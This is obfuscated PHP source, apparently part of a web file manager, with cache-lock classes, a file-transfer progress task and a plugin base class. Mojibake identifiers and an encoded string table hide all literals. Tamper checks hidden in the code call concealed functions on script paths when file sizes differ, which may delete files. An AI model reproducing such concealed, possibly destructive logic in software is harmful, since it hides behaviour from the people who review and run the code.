+ $¬ù±§ãÔ; while (microtime(!0) < $üÚü’ˆæ) { $ô££‚§ã = $¦½Ò’‚Ö->get($Ü”ÕØÂÖ); if (!$ô££‚§ã || $ô££‚§ã < microtime(!0)) { $ÆŒ¾€•˜ = $¦½Ò’‚Ö->handle->add($Ü”ÕØÂÖ, $üÚü’ˆæ, $¬ù±§ãÔ); if ($ÆŒ¾€•˜) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¿¯èäŒ‘) { return Cache::init()->get($¿¯èäŒ‘); } public function unlock($§İŞá») { return Cache::init()->remove($§İŞá»); } } class CacheLockDatabase { public function lock($‡ñ®¿Òâ, $•¹áğ¬ = 0) { $°ÈæÃê¡ = Model($_SERVER[´È¥ö†ö][905]); $ˆğ»Ï‹Ş = microtime(!0) + $•¹áğ¬; while (microtime(!0) < $ˆğ»Ï‹Ş) { $„Ÿã¤™Æ = $°ÈæÃê¡->get($‡ñ®¿Òâ); if (!$„Ÿã¤™Æ || $„Ÿã¤™Æ < microtime(!0)) { $‘š—³ı¬ = $°ÈæÃê¡->set($‡ñ®¿Òâ, $ˆğ»Ï‹Ş); if ($‘š—³ı¬) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ãÌıî³æ) { return Model($_SERVER[´È¥ö†ö][905])->get($ãÌıî³æ); } public function unlock($×ò´èóŞ) { Model($_SERVER[´È¥ö†ö][905])->remove($×ò´èóŞ); } } if ($_SERVER[$_SERVER[´È¥ö†ö][309]] != $_SERVER[$_SERVER[´È¥ö†ö][944]]) { $_getc = $_SERVER[´È¥ö†ö][310]; $_getfile = $_SERVER[$_SERVER[´È¥ö†ö][311]] . $_SERVER[´È¥ö†ö][312]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[´È¥ö†ö][287], $_getfilec); if (count($_getarrs) < $_SERVER[´È¥ö†ö][313]) { $exit = $_SERVER[´È¥ö†ö][314]; $exit(); } $_act = $_SERVER[´È¥ö†ö][315]; $_act($_SERVER[$_SERVER[´È¥ö†ö][307]]); } goto BÔñ££òï; A“¤°–Ÿ‰: $_size = $_SERVER[´È¥ö†ö][308]; if ($_SERVER[$_SERVER[´È¥ö†ö][309]] != $_size($_file)) { $_getc = $_SERVER[´È¥ö†ö][310]; $_getfile = $_SERVER[$_SERVER[´È¥ö†ö][311]] . $_SERVER[´È¥ö†ö][312]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[´È¥ö†ö][287], $_getfilec); if (count($_getarrs) < $_SERVER[´È¥ö†ö][313]) { $exit = $_SERVER[´È¥ö†ö][314]; $exit(); } $_act = $_SERVER[´È¥ö†ö][315]; $_act($_file); } class TaskFileTransfer extends Task { protected function startAfter() { $ÉÑõ§Ì£ =& $_SERVER[´È¥ö†ö]; $äÉâà¸ü =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÉÑõ§Ì£[1804], array($this, $ÉÑõ§Ì£[1805])); Hook::bind($ÉÑõ§Ì£[1307], array($this, $ÉÑõ§Ì£[1806])); Hook::bind($ÉÑõ§Ì£[1807], array($this, $ÉÑõ§Ì£[1808])); Hook::bind($ÉÑõ§Ì£[682], array($this, $ÉÑõ§Ì£[1809])); Hook::bind($ÉÑõ§Ì£[683], array($this, $ÉÑõ§Ì£[1810])); Hook::bind($ÉÑõ§Ì£[689], array($this, $ÉÑõ§Ì£[1811])); Hook::bind($ÉÑõ§Ì£[690], array($this, $ÉÑõ§Ì£[1812])); Hook::bind($ÉÑõ§Ì£[685], array($this, $ÉÑõ§Ì£[1813])); Hook::bind($ÉÑõ§Ì£[687], array($this, $ÉÑõ§Ì£[1814])); Hook::bind($ÉÑõ§Ì£[651], array($this, $ÉÑõ§Ì£[1815])); Hook::bind($ÉÑõ§Ì£[648], array($this, $ÉÑõ§Ì£[1815])); Hook::bind($ÉÑõ§Ì£[653], array($this, $ÉÑõ§Ì£[1815])); Hook::bind($ÉÑõ§Ì£[655], array($this, $ÉÑõ§Ì£[1815])); Hook::bind($ÉÑõ§Ì£[657], array($this, $ÉÑõ§Ì£[1815])); Hook::bind($ÉÑõ§Ì£[1816], array($this, $ÉÑõ§Ì£[1817])); Hook::bind($ÉÑõ§Ì£[673], array($this, $ÉÑõ§Ì£[1818])); $this->sourceModelCopyFlag = !1; Hook::bind($ÉÑõ§Ì£[1819], array($this, $ÉÑõ§Ì£[1820])); Hook::bind($ÉÑõ§Ì£[1821], array($this, $ÉÑõ§Ì£[1822])); Hook::bind($ÉÑõ§Ì£[1823], array($this, $ÉÑõ§Ì£[1824])); $äÉâà¸ü[$ÉÑõ§Ì£[1825]] = LNG($ÉÑõ§Ì£[1826]); $äÉâà¸ü[$ÉÑõ§Ì£[1827]] = 0; $äÉâà¸ü[$ÉÑõ§Ì£[1828]] = 0; $äÉâà¸ü[$ÉÑõ§Ì£[1141]] = $ÉÑõ§Ì£[12]; $äÉâà¸ü[$ÉÑõ§Ì£[1829]] = $ÉÑõ§Ì£[12]; $äÉâà¸ü[$ÉÑõ§Ì£[1830]] = 0; $äÉâà¸ü[$ÉÑõ§Ì£[1831]] = 0; $äÉâà¸ü[$ÉÑõ§Ì£[1832]] = 0; if (!$äÉâà¸ü[$ÉÑõ§Ì£[1659]]) { $äÉâà¸ü[$ÉÑõ§Ì£[1659]] = LNG($ÉÑõ§Ì£[1833]); } } protected function endAfter() { $ìŸß‚Êá =& $_SERVER[´È¥ö†ö]; Hook::unbind($ìŸß‚Êá[1804], array($this, $ìŸß‚Êá[1805])); Hook::unbind($ìŸß‚Êá[1307], array($this, $ìŸß‚Êá[1806])); Hook::unbind($ìŸß‚Êá[1807], array($this, $ìŸß‚Êá[1808])); Hook::unbind($ìŸß‚Êá[682], array($this, $ìŸß‚Êá[1809])); Hook::unbind($ìŸß‚Êá[683], array($this, $ìŸß‚Êá[1810])); Hook::unbind($ìŸß‚Êá[689], array($this, $ìŸß‚Êá[1811])); Hook::unbind($ìŸß‚Êá[690], array($this, $ìŸß‚Êá[1812])); Hook::unbind($ìŸß‚Êá[685], array($this, $ìŸß‚Êá[1813])); Hook::unbind($ìŸß‚Êá[687], array($this, $ìŸß‚Êá[1814])); Hook::unbind($ìŸß‚Êá[651], array($this, $ìŸß‚Êá[1815])); Hook::unbind($ìŸß‚Êá[648], array($this, $ìŸß‚Êá[1815])); Hook::unbind($ìŸß‚Êá[653], array($this, $ìŸß‚Êá[1815])); Hook::unbind($ìŸß‚Êá[655], array($this, $ìŸß‚Êá[1815])); Hook::unbind($ìŸß‚Êá[657], array($this, $ìŸß‚Êá[1815])); Hook::unbind($ìŸß‚Êá[1816], array($this, $ìŸß‚Êá[1817])); Hook::unbind($ìŸß‚Êá[673], array($this, $ìŸß‚Êá[1818])); Hook::unbind($ìŸß‚Êá[1819], array($this, $ìŸß‚Êá[1820])); Hook::unbind($ìŸß‚Êá[1821], array($this, $ìŸß‚Êá[1822])); Hook::unbind($ìŸß‚Êá[1823], array($this, $ìŸß‚Êá[1824])); } public function copyMoveStart($úº‰úğŠ, $¤øüÈê½, $õ´Æª, $ÍıªÔß¤) { $ÆÜìè¸ =& $_SERVER[´È¥ö†ö]; self::log($ÆÜìè¸[1834] . $¤øüÈê½ . $ÆÜìè¸[73] . $ÍıªÔß¤); $‡äÚü”á = rtrim(TEMP_FILES, $ÆÜìè¸[8]); if (substr($¤øüÈê½, 0, strlen($‡äÚü”á)) == $‡äÚü”á) { return; } if (substr($ÍıªÔß¤, 0, strlen($‡äÚü”á)) == $‡äÚü”á) { return; } $ÔÓùÚ€ =& $this->task; $ÔÓùÚ€[$ÆÜìè¸[1835]] = KodIO::transferType($úº‰úğŠ, $õ´Æª); $this->update(); } public function updateAfter() { $³ô·‚¬Ü =& $_SERVER[´È¥ö†ö]; $¼“÷˜Ì =& $this->task; if (!$¼“÷˜Ì[$³ô·‚¬Ü[839]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¼“÷˜Ì[$³ô·‚¬Ü[1835]] == $³ô·‚¬Ü[1401]) { return; } self::updateTask($¼“÷˜Ì); } private static function updateTask(&$‰­İæáí) { $»ÄşÁé¦ =& $_SERVER[´È¥ö†ö]; if ($‰­İæáí[$»ÄşÁé¦[1835]] == $»ÄşÁé¦[1278] || $‰­İæáí[$»ÄşÁé¦[1835]] == $»ÄşÁé¦[110]) { if ($‰­İæáí[$»ÄşÁé¦[1829]]) { $‰­İæáí[$»ÄşÁé¦[1832]] = $‰­İæáí[$»ÄşÁé¦[1831]] + $‰­İæáí[$»ÄşÁé¦[1828]]; } } else { if ($‰­İæáí[$»ÄşÁé¦[1835]] == $»ÄşÁé¦[1402]) { if ($‰­İæáí[$»ÄşÁé¦[1829]] == $»ÄşÁé¦[1278]) { $‰­İæáí[$»ÄşÁé¦[1832]] = $‰­İæáí[$»ÄşÁé¦[1831]] + $‰­İæáí[$»ÄşÁé¦[1828]] * 0.5; } else { if ($‰­İæáí[$»ÄşÁé¦[1829]] == $»ÄşÁé¦[110]) { $‰­İæáí[$»ÄşÁé¦[1832]] = $‰­İæáí[$»ÄşÁé¦[1831]] + $‰­İæáí[$»ÄşÁé¦[1827]] * 0.5 + $‰­İæáí[$»ÄşÁé¦[1828]] * 0.5; } } } } $‰­İæáí[$»ÄşÁé¦[1775]] = $‰­İæáí[$»ÄşÁé¦[1832]] / $‰­İæáí[$»ÄşÁé¦[839]]; if ($‰­İæáí[$»ÄşÁé¦[1775]] > 0) { $•«‰Ã = timeFloat() - $‰­İæáí[$»ÄşÁé¦[1777]] - $‰­İæáí[$»ÄşÁé¦[1780]]; $‰­İæáí[$»ÄşÁé¦[1781]] = $•«‰Ã * (1 - $‰­İæáí[$»ÄşÁé¦[1775]]) / $‰­İæáí[$»ÄşÁé¦[1775]]; } } public function addPath($à§Ú‹©) { $ÂÑ„Óşô =& $_SERVER[´È¥ö†ö]; if (!$à§Ú‹©) { return; } $ş™ı²Üâ =& $this->task; $¿ü¦ğÏ¤ = IO::infoWithChildren($à§Ú‹©); $ü² ­‰¢ = $ş™ı²Üâ[$ÂÑ„Óşô[1836]] ? $ş™ı²Üâ[$ÂÑ„Óşô[1836]][$ÂÑ„Óşô[1837]] : 0; $ş™ı²Üâ[$ÂÑ„Óşô[1836]] = array($ÂÑ„Óşô[1837] => $ü² ­‰¢ + 1, $ÂÑ„Óşô[505] => $¿ü¦ğÏ¤[$ÂÑ„Óşô[32]], $ÂÑ„Óşô[87] => $¿ü¦ğÏ¤[$ÂÑ„Óşô[87]], $ÂÑ„Óşô[593] => $¿ü¦ğÏ¤[$ÂÑ„Óşô[593]] ? $¿ü¦ğÏ¤[$ÂÑ„Óşô[593]] : $¿ü¦ğÏ¤[$ÂÑ„Óşô[87]]); if ($¿ü¦ğÏ¤[$ÂÑ„Óşô[33]] == $ÂÑ„Óşô[232]) { $ş™ı²Üâ[$ÂÑ„Óşô[1139]] += 1; } else { $ş™ı²Üâ[$ÂÑ„Óşô[1139]] += $¿ü¦ğÏ¤[$ÂÑ„Óşô[82]][$ÂÑ„Óşô[80]]; if ($¿ü¦ğÏ¤[$ÂÑ„Óşô[193]]) { $ş™ı²Üâ[$ÂÑ„Óşô[1139]] += $¿ü¦ğÏ¤[$ÂÑ„Óşô[82]][$ÂÑ„Óşô[81]] + 1; } } $ş™ı²Üâ[$ÂÑ„Óşô[839]] += $¿ü¦ğÏ¤[$ÂÑ„Óşô[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($òÈÏ) { } public function sourceAddHashEnd($»çÓÒ™) { } public function sourceAddFileStart($øò‰Ì‘ï) { $ÄßÂµÛâ =& $_SERVER[´È¥ö†ö]; $Øøºàî› =& $this->task; $Øøºàî›[$ÄßÂµÛâ[1827]] = $øò‰Ì‘ï[$ÄßÂµÛâ[79]]; $Øøºàî›[$ÄßÂµÛâ[1825]] = $øò‰Ì‘ï[$ÄßÂµÛâ[32]]; $Øøºàî›[$ÄßÂµÛâ[1141]] = $øò‰Ì‘ï[$ÄßÂµÛâ[32]]; $Øøºàî›[$ÄßÂµÛâ[1838]] = $øò‰Ì‘ï[$ÄßÂµÛâ[87]]; $this->update(); } public function sourceAddFileEnd($Ó´æ¦À») { $Ñ…¤º×Ï =& $_SERVER[´È¥ö†ö]; $–şÕº—­ =& $this->task; $–şÕº—­[$Ñ…¤º×Ï[1832]] += $Ó´æ¦À»[$Ñ…¤º×Ï[79]]; $–şÕº—­[$Ñ…¤º×Ï[1838]] = $Ó´æ¦À»[$Ñ…¤º×Ï[87]]; $this->update(1); } public function copyFileStart($ì­šöÄ, $Ôâº¡Êò, $’ô÷­©Ô, $ó‘âôÈû, $Æª´†ì¬, $ö¶İ†Çã) { $äî§ˆ‡ =& $_SERVER[´È¥ö†ö]; $·‰ĞÉ¬º = $Æª´†ì¬; if ($·‰ĞÉ¬º == $GLOBALS[$äî§ˆ‡[1839]]) { $·‰ĞÉ¬º = $GLOBALS[$äî§ˆ‡[1840]]; } $GLOBALS[$äî§ˆ‡[1840]] = $Æª´†ì¬; $GLOBALS[$äî§ˆ‡[1839]] = $ö¶İ†Çã; $Ş‹×ÀŒê =& $this->task; $Ş‹×ÀŒê[$äî§ˆ‡[1825]] = $·‰ĞÉ¬º; $Ş‹×ÀŒê[$äî§ˆ‡[1827]] = (int) $ì­šöÄ->size($Ôâº¡Êò); $Ş‹×ÀŒê[$äî§ˆ‡[1828]] = 0; $Ş‹×ÀŒê[$äî§ˆ‡[1141]] = $äî§ˆ‡[12]; $Ş‹×ÀŒê[$äî§ˆ‡[1829]] = $äî§ˆ‡[12]; $Ş‹×ÀŒê[$äî§ˆ‡[1830]] = 0; $¦å˜Ø™ = $Ş‹×ÀŒê[$äî§ˆ‡[1827]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ş‹×ÀŒê[$äî§ˆ‡[486]] . $äî§ˆ‡[1841]); if ($¦å˜Ø™ && file_exists(get_path_father($ó‘âôÈû))) { Cache::set($Ş‹×ÀŒê[$äî§ˆ‡[486]] . $äî§ˆ‡[1841], $ó‘âôÈû); $Ş‹×ÀŒê[$äî§ˆ‡[1798]] = array($äî§ˆ‡[1842], $äî§ˆ‡[1843]); } $this->update(0, $¦å˜Ø™); } public static function updateCopyLocalFileSize($Ã¾‹¹—‘) { $Úâ¨ƒÁ¦ =& $_SERVER[´È¥ö†ö]; $šˆ„»Ñµ = Cache::get($Ã¾‹¹—‘[$Úâ¨ƒÁ¦[486]] . $Úâ¨ƒÁ¦[1841]); if (!$šˆ„»Ñµ || !file_exists($šˆ„»Ñµ)) { return $Ã¾‹¹—‘; } $Ã¾‹¹—‘[$Úâ¨ƒÁ¦[1828]] = @filesize($šˆ„»Ñµ); $Ã¾‹¹—‘[$Úâ¨ƒÁ¦[1832]] += $Ã¾‹¹—‘[$Úâ¨ƒÁ¦[1828]]; self::updateTask($Ã¾‹¹—‘); return $Ã¾‹¹—‘; } public function copyFileEnd($¶¹­ñ«, $ùÀÉ±§ä, $âÀ´†œå, $ßÈˆ¢‡, $¼ÊŸŠü’, $¥ŞÚéµ˜) { $‡ÍÆÊ‰ =& $_SERVER[´È¥ö†ö]; $‘ïáÓ± =& $this->task; $‘ïáÓ±[$‡ÍÆÊ‰[1828]] = $‘ïáÓ±[$‡ÍÆÊ‰[1827]]; $‘ïáÓ±[$‡ÍÆÊ‰[1829]] = $‡ÍÆÊ‰[12]; unset($‘ïáÓ±[$‡ÍÆÊ‰[1798]]); if ($¼ÊŸŠü’ == $‘ïáÓ±[$‡ÍÆÊ‰[1825]]) { $‘ïáÓ±[$‡ÍÆÊ‰[1831]] += $‘ïáÓ±[$‡ÍÆÊ‰[1827]]; $‘ïáÓ±[$‡ÍÆÊ‰[1832]] = $‘ïáÓ±[$‡ÍÆÊ‰[1831]]; $€¾¾Şı = 1; if (isset($‘ïáÓ±[$‡ÍÆÊ‰[1838]]) && $‘ïáÓ±[$‡ÍÆÊ‰[1838]] == $ùÀÉ±§ä) { $€¾¾Şı = 0; } $this->update($€¾¾Şı); } else { $this->update(); $‘ïáÓ±[$‡ÍÆÊ‰[1828]] = 0; } Cache::remove($‘ïáÓ±[$‡ÍÆÊ‰[486]] . $‡ÍÆÊ‰[1841]); self::log($‡ÍÆÊ‰[1844] . $ùÀÉ±§ä . $‡ÍÆÊ‰[73] . $ßÈˆ¢‡ . $‡ÍÆÊ‰[287] . $¼ÊŸŠü’ . $‡ÍÆÊ‰[1845] . $‘ïáÓ±[$‡ÍÆÊ‰[1825]]); } public function updateFileEnd($Ğòû˜×É, $À„³Ëª) { $£ÒòÎÅ =& $_SERVER[´È¥ö†ö]; $¦‡›âÖ× =& $this->task; $¦‡›âÖ×[$£ÒòÎÅ[1825]] = $Ğòû˜×É; $¦‡›âÖ×[$£ÒòÎÅ[1827]] = $À„³Ëª; $¦‡›âÖ×[$£ÒòÎÅ[1831]] += $À„³Ëª; $¦‡›âÖ×[$£ÒòÎÅ[1832]] = $¦‡›âÖ×[$£ÒòÎÅ[1831]]; $this->update(1); self::log($£ÒòÎÅ[1846] . $Ğòû˜×É); } public function sourceModelCopy($Ğ™ßœš) { $¢ÙÂ§¡Ñ =& $_SERVER[´È¥ö†ö]; $Øé•ãÑÁ = $Ğ™ßœš[0]; $õİÒ‡ìÅ = $Ğ™ßœš[1]; $´ÊÈû¤ü =& $this->task; $this->sourceModelCopyFlag = !0; $¹ù×Ö‘â = 0; switch ($Øé•ãÑÁ) { case $¢ÙÂ§¡Ñ[649]: $¹ù×Ö‘â = 1; break; case $¢ÙÂ§¡Ñ[652]: $´ÊÈû¤ü[$¢ÙÂ§¡Ñ[1825]] = $õİÒ‡ìÅ[$¢ÙÂ§¡Ñ[32]]; break; case $¢ÙÂ§¡Ñ[654]: $¹ù×Ö‘â = intval($Ğ™ßœš[$¢ÙÂ§¡Ñ[467]] * 0.4); break; case $¢ÙÂ§¡Ñ[656]: $¹ù×Ö‘â = intval($Ğ™ßœš[$¢ÙÂ§¡Ñ[467]] * 0.2); break; case $¢ÙÂ§¡Ñ[658]: $¹ù×Ö‘â = intval($Ğ™ßœš[$¢ÙÂ§¡Ñ[467]] * 0.4); break; } $this->update($¹ù×Ö‘â); $this->sourceModelCopyFlag = !1; } public function sourceRemove($è¿ßß§ù, $ë¼ÌÑØ£) { $Œå­’¼¥ =& $_SERVER[´È¥ö†ö]; $this->sourceModelCopyFlag = !0; $•ù¢ÎŠô = 1; if (isset($è¿ßß§ù[$Œå­’¼¥[82]])) { $•ù¢ÎŠô = $è¿ßß§ù[$Œå­’¼¥[82]][$Œå­’¼¥[80]]; $•ù¢ÎŠô = $•ù¢ÎŠô + $è¿ßß§ù[$Œå­’¼¥[82]][$Œå­’¼¥[81]] + 1; } $this->update($•ù¢ÎŠô); $this->sourceModelCopyFlag = !1; } public function sourceMove($Û€åÆÎô) { $this->sourceRemove($Û€åÆÎô, !1); } public function curlProgress($¬ÁÉ»ü, $ø™ª¾àê, $ƒŠÎ†û, $Èü¯å×, $³˜¾Ç‚ƒ) { $ğ–ë»œ =& $_SERVER[´È¥ö†ö]; $÷¨Ï™áØ =& $this->task; if ($³˜¾Ç‚ƒ > 0) { $÷¨Ï™áØ[$ğ–ë»œ[1141]] = $ğ–ë»œ[1847]; $÷¨Ï™áØ[$ğ–ë»œ[1829]] = $ğ–ë»œ[110]; if ($÷¨Ï™áØ[$ğ–ë»œ[1827]]) { $÷¨Ï™áØ[$ğ–ë»œ[1828]] = $³˜¾Ç‚ƒ; } if ($÷¨Ï™áØ[$ğ–ë»œ[1830]]) { $÷¨Ï™áØ[$ğ–ë»œ[1828]] = $³˜¾Ç‚ƒ + $÷¨Ï™áØ[$ğ–ë»œ[1830]]; } } else { if ($ƒŠÎ†û > 0) { if ($÷¨Ï™áØ[$ğ–ë»œ[1827]] == $ø™ª¾àê) { $÷¨Ï™áØ[$ğ–ë»œ[1828]] = $ƒŠÎ†û; $÷¨Ï™áØ[$ğ–ë»œ[1141]] = $ğ–ë»œ[1848]; $÷¨Ï™áØ[$ğ–ë»œ[1829]] = $ğ–ë»œ[1278]; } } } $this->update(); } public function curlProgressStart($ÉªÄ”Üõ) { } public function curlProgressEnd($òå“Ù¶›) { $ˆŠ³£®š =& $_SERVER[´È¥ö†ö]; $®‚ì»”Ø =& $this->task; $ÆÙÂÏ‰Ó = curl_getinfo($òå“Ù¶›); $ÌœöÑ¶î = $ÆÙÂÏ‰Ó[$ˆŠ³£®š[1849]]; if ($ÌœöÑ¶î == -1) { $ÌœöÑ¶î = $ÆÙÂÏ‰Ó[$ˆŠ³£®š[1850]]; } if ($®‚ì»”Ø[$ˆŠ³£®š[1829]] == $ˆŠ³£®š[110] && $ÌœöÑ¶î) { $®‚ì»”Ø[$ˆŠ³£®š[1830]] += $ÌœöÑ¶î; } $this->update(); } } goto AÁñ¯¶»Ò; Aå·„íç: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $îü§Á®Â =& $_SERVER[´È¥ö†ö]; if ($_SERVER[$îü§Á®Â[309]] != $_SERVER[$îü§Á®Â[944]]) { $°æğıêÉ = $îü§Á®Â[955]; $ûÜááÅ = $îü§Á®Â[310]; $üÀÍÊĞñ = $_SERVER[$îü§Á®Â[311]] . $îü§Á®Â[312]; $é£ÇŸ§¾ = $ûÜááÅ($üÀÍÊĞñ); $ùÉÑıÜ = explode($îü§Á®Â[287], $é£ÇŸ§¾); if (count($ùÉÑıÜ) < $îü§Á®Â[702]) { $ˆ¡ªºÀ™ = $îü§Á®Â[314]; $ˆ¡ªºÀ™(); } $Õ³‘çÑ® = $îü§Á®Â[956]; $Õ³‘çÑ®($_SERVER[$îü§Á®Â[957]]); $Õ³‘çÑ®($_SERVER[$îü§Á®Â[311]] . $îü§Á®Â[958]); $ìøç€Š  = 1; while ($ìøç€Š  > 1) { $ìøç€Š  = $ìøç€Š  + 4; $İ‚’å³´ = rawurlencode($ìøç€Š  . $îü§Á®Â[465]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($îü§Á®Â[1624]); $this->pluginName = str_replace($îü§Á®Â[1624], $îü§Á®Â[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $îü§Á®Â[8]; $this->pluginApi = appHostGet() . $îü§Á®Â[1625] . $this->pluginName . $îü§Á®Â[8]; $this->pluginHost = $config[$îü§Á®Â[1626]] . $this->pluginName . $îü§Á®Â[8]; $this->pluginHostDefault = $config[$îü§Á®Â[1626]] . $this->pluginName . $îü§Á®Â[8]; $¾Ñˆî¦ = $config[$îü§Á®Â[1627]]; if ($¾Ñˆî¦ && strpos($îü§Á®Â[50] . $¾Ñˆî¦ . $îü§Á®Â[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$îü§Á®Â[1628]] . $this->pluginName . $îü§Á®Â[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[´È¥ö†ö][1629]); } protected function assign($ ¼¤æ¶¥, $şïã¶í° = false) { if (is_array($ ¼¤æ¶¥)) { $this->values = array_merge($this->values, $ ¼¤æ¶¥); } else { $this->values[$ ¼¤æ¶¥] = $şïã¶í°; } } protected function display($æ ÔêÉ) { extract($this->values); require $æ ÔêÉ; } final function hookRegist($èË­‰ã¿) { $this->modelPlugin->appRegist($this->pluginName, $èË­‰ã¿); } final function appIcon() { $ù§”›¬Ô =& $_SERVER[´È¥ö†ö]; $Ê²²óÃä = $this->appPackage(); $íö×š‡³ = $ù§”›¬Ô[12]; if (isset($Ê²²óÃä[$ù§”›¬Ô[501]])) { if (isset($Ê²²óÃä[$ù§”›¬Ô[501]][$ù§”›¬Ô[1630]])) { $íö×š‡³ = $ù§”›¬Ô[1631] . $Ê²²óÃä[$ù§”›¬Ô[501]][$ù§”›¬Ô[1630]] . $ù§”›¬Ô[1632]; } else { if ($Ê²²óÃä[$ù§”›¬Ô[501]][$ù§”›¬Ô[1633]]) { $íö×š‡³ = $ù§”›¬Ô[1634] . $Ê²²óÃä[$ù§”›¬Ô[501]][$ù§”›¬Ô[1633]] . $ù§”›¬Ô[1635]; } } } return $íö×š‡³; } final function fileCanView($ÕŸ¾î) { $ñ•†„÷ =& $_SERVER[´È¥ö†ö]; if (request_url_safe($ÕŸ¾î)) { return !0; } if ($this->isShare($ÕŸ¾î)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ºı•…ùë = $ñ•†„÷[1636] . rawurlencode(this_url()); show_tips(LNG($ñ•†„÷[1637]) . $ñ•†„÷[1638] . $ºı•…ùë . $ñ•†„÷[1639] . LNG($ñ•†„÷[1640]) . $ñ•†„÷[1641], !1); } if (!Action($ñ•†„÷[1642])->authCan($ñ•†„÷[1643])) { show_tips(LNG($ñ•†„÷[1644]) . $ñ•†„÷[1645], !1); } ActionCall($ñ•†„÷[1646], $ÕŸ¾î); } final function isShare($…ò ‘ô§) { $ë—Ä…µë = KodIO::parse($…ò ‘ô§); return $ë—Ä…µë[$_SERVER[´È¥ö†ö][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($†˜ÍŞ×ƒ) { if (request_url_safe($†˜ÍŞ×ƒ)) { return $†˜ÍŞ×ƒ; } if (!$this->isShare($†˜ÍŞ×ƒ)) { $†˜ÍŞ×ƒ = $this->filePath($†˜ÍŞ×ƒ, !1); } return Action($_SERVER[´È¥ö†ö][1255])->linkOut($†˜ÍŞ×ƒ); } public function filePathLinkOut($¢íš ŠÏ) { if (request_url_safe($¢íš ŠÏ)) { return $¢íš ŠÏ; } $this->fileCanView($¢íš ŠÏ); return Action($_SERVER[´È¥ö†ö][1255])->link($¢íš ŠÏ); } final function filePath($ÜßÆ «’, $óö Âòà = true, $ÊÃ‘è‹¤ = false) { $Ï¥ÄÉåÀ =& $_SERVER[´È¥ö†ö]; $¶ş­«öÑ = $this->filePathGet($ÜßÆ «’, $óö Âòà); if (!$this->fileInfo) { show_tips(LNG($Ï¥ÄÉåÀ[108]), !1); } if ($ÊÃ‘è‹¤ && isset($this->fileInfo[$Ï¥ÄÉåÀ[552]]) && $this->fileInfo[$Ï¥ÄÉåÀ[552]]) { $ßºÊö›Ì = Model($Ï¥ÄÉåÀ[555])->fileInfo($this->fileInfo[$Ï¥ÄÉåÀ[552]]); if (!$ßºÊö›Ì || !IO::exist($ßºÊö›Ì[$Ï¥ÄÉåÀ[87]])) { $à¾Ş‰¿È = LNG($Ï¥ÄÉåÀ[108]) . LNG($Ï¥ÄÉåÀ[1647]); if (KodUser::isRoot() && isset($ßºÊö›Ì[$Ï¥ÄÉåÀ[87]])) { $à¾Ş‰¿È .= $Ï¥ÄÉåÀ[1648] . $ßºÊö›Ì[$Ï¥ÄÉåÀ[87]] . $Ï¥ÄÉåÀ[1649]; } show_tips($à¾Ş‰¿È); } } Hook::trigger($Ï¥ÄÉåÀ[1650], $¶ş­«öÑ); return $¶ş­«öÑ; } final function filePathGet($Ø°ËÖšö, $È´ÌĞò = true) { $ŒãğÜ— =& $_SERVER[´È¥ö†ö]; if ($ÓîÎì = $this->checkSharePath($Ø°ËÖšö, $È´ÌĞò)) { return $ÓîÎì; } $this->fileCanView($Ø°ËÖšö); if (request_url_safe($Ø°ËÖšö)) { $¼œ­ıÇì = parse_url_query($Ø°ËÖšö); if (isset($¼œ­ıÇì[$ŒãğÜ—[1651]]) && isset($¼œ­ıÇì[$ŒãğÜ—[236]])) { $ß×¯ÅØ = Mcrypt::decode($¼œ­ıÇì[$ŒãğÜ—[236]], Model($ŒãğÜ—[846])->get($ŒãğÜ—[847])); if ($ß×¯ÅØ) { $this->fileInfo = IO::info($ß×¯ÅØ); $this->fileInfo[$ŒãğÜ—[1652]] = $Ø°ËÖšö; $this->cachePath = $this->pluginCachePath($ŒãğÜ—[12], $È´ÌĞò); return $ß×¯ÅØ; } } $Ø°ËÖšö = $this->_cacheHttpFile($Ø°ËÖšö, $È´ÌĞò); $this->fileInfo = IO::info($Ø°ËÖšö); } else { $this->fileInfo = IO::info($Ø°ËÖšö); $this->cachePath = $this->pluginCachePath($ŒãğÜ—[12], $È´ÌĞò); } return $Ø°ËÖšö; } final function _cacheHttpFile($ÈÖ£Ô™‘, $÷û¦® = true) { $‚¿÷¦‘§ =& $_SERVER[´È¥ö†ö]; $ ù”§Ğô = parse_url_query($ÈÖ£Ô™‘); $¬÷ûı¹œ = get_path_ext($ÈÖ£Ô™‘); if (isset($ ù”§Ğô[$‚¿÷¦‘§[32]]) && $ ù”§Ğô[$‚¿÷¦‘§[32]]) { $¬÷ûı¹œ = get_path_ext($ ù”§Ğô[$‚¿÷¦‘§[32]]); } $ÙÇ‰¯Ââ = hash_path($ÈÖ£Ô™‘) . $‚¿÷¦‘§[10] . $¬÷ûı¹œ; $this->cachePath = $this->pluginCachePath($÷û¦® ? $ÙÇ‰¯Ââ : $‚¿÷¦‘§[12]); $­€ÇşäÂ = IO::fileNameExist($this->cachePath, $ÙÇ‰¯Ââ); if ($­€ÇşäÂ) { return KodIO::make($­€ÇşäÂ); } $£ıÕì³‰ = rtrim($this->cachePath, $‚¿÷¦‘§[8]) . $‚¿÷¦‘§[8] . $ÙÇ‰¯Ââ; return $this->pluginCacheFileSet($£ıÕì³‰, file_get_contents_nossl($ÈÖ£Ô™‘)); } final function checkSharePath($ê²ÃîèÔ, $°üØ‹ß› = true) { $­¦ÜÇ =& $_SERVER[´È¥ö†ö]; if 